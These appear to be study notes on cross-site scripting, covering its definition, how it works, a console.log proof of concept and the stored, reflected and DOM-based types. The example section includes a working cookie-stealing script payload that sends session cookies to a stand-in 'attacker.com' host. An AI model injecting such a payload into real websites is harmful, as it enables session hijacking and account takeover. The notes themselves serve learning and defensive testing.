It is a web security flaw that lets attackers inject malicious code into a website, compromising user interactions.

Bypasses Same Origin Policy: XSS evades the security rule that keeps websites isolated, allowing attackers to access or manipulate user sessions.

Masquerades as User: Attackers can impersonate victims, performing actions or stealing data the user can access.

Example: An attacker injects <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script> into a comment field. 
When a user views the comment, their session cookie is sent to the attacker’s server, letting the attacker log in as the user.

High Risk for Privileged Users: If the victim has admin rights, attackers could gain full control over the application’s functionality and data.

-

How does XSS work?

Malicious Code Injection: An attacker injects harmful JavaScript into a website’s input fields (e.g., forms, comments, or URLs) or database, 
which runs in a user’s browser when they load the affected page.

Exploits User Session: The code steals session data (like cookies) or performs actions as the user, bypassing security to access their account or data.

-

XSS proof of concept

Can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript using:
console.log() or alert()

Example PoC: 
Inject 

<script>console.log("XSS PoC Success")</script> 

into a vulnerable input field (e.g., a comment box, search field, or URL parameter) on the target website. 
If the console shows "XSS PoC Success" when the page loads, the XSS is confirmed.

Check console output in the browser's Developer Tools by going to the Console tab, and look for the output: "XSS PoC Success" from console.log()

-

Types of XSS attacks:

1. Stored (Persistent) XSS: The malicious script is permanently saved on the target server (e.g., in a database, comment section, forum post), 
affecting users who access the compromised page.

2. Reflected (Non-Persistent) XSS: The malicious script is reflected off the web server in an error message or search result, 
requiring the attacker to trick the victim into clicking a specially crafted link. 
Web server doesn't check the mal input and embeds in the HTTP response that causes the vuln.

3. DOM-based XSS: The vulnerability lies in the client-side code (JavaScript) that processes data, 
modifying the Document Object Model (DOM) environment in the victim's browser rather than the server response itself.
















